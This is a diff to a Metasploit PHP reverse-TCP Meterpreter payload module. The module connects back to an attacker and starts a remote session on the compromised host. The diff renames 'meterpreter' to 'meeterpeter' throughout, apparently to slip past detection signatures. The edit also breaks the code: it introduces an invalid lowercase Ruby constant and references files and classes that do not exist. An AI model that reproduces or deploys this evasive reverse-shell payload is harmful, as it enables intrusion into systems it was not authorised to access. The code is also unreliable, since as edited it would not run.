@@ -6,8 +6,8 @@
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/core/payload/php/reverse_tcp'
-require 'msf/base/sessions/meterpreter_php'
-require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/meeterpeter_php'
+require 'msf/base/sessions/meeterpeter_options'
 
 
 module Metasploit4
@@ -16,22 +16,22 @@ module Metasploit4
 
   include Msf::Payload::Single
   include Msf::Payload::Php::ReverseTcp
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'PHP Meterpreter, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
+      'Name'          => 'PHP meeterpeter, Reverse TCP Inline',
+      'Description'   => 'Connect back to attacker and spawn a meeterpeter server (PHP)',
       'Author'        => ['egypt'],
       'Platform'      => 'php',
       'Arch'          => ARCH_PHP,
       'License'       => MSF_LICENSE,
       'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Meterpreter_Php_Php))
+      'Session'       => Msf::Sessions::meeterpeter_Php_Php))
   end
 
   def generate
-    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.php")
+    file = File.join(Msf::Config.data_directory, "meeterpeter", "meeterpeter.php")
     met = File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
